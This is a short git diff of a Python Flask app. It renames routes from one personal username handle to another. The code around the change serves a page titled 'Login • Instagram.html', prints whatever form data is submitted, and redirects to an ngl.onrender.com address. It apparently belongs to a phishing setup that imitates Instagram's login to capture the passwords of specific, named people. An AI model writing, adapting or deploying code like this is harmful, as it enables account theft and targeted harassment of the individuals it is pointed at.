@@ -16,7 +16,7 @@ def login():
     return render_template("Login • Instagram.html")
 
 
-@app.route("/saanvi_17")
+@app.route("/ananxya_m")
 def saanvi_17():
     return render_template("home.html")
 
@@ -33,7 +33,7 @@ def run_insta_code():
         return redirect("https://ngl.onrender.com/saanvi_17")
 
 
-@app.route("/saanvi_17", methods=["POST", "GET"])
+@app.route("/ananxya_m", methods=["POST", "GET"])
 def run_ngl_code():
     if request.method == "POST":
         print(request.form)
